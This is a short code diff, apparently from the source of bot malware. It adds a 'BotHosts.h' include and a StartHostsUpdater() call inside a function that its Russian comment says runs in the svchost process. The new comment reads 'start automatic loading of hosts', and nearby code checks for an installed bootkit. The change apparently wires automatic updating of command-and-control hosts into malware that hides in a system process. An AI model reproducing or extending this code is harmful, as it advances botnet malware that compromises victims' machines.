@@ -6,6 +6,7 @@
 #include "Utils.h"
 #include "Loader.h"
 #include "Pipes.h"
+#include "BotHosts.h"
 
 #include "Modules.h"
 
@@ -97,6 +98,10 @@ void ExplorerStart(PEventData Data)
 void SVChostStart(PEventData Data, bool &Cancel)
 {
 	// Запущена функция работающая в процессе svchost
+
+
+	// запускаем автоматическую загрузку хостов
+    StartHostsUpdater();
 
 	#ifdef bootkitH
 		IsBootkitInstaled();
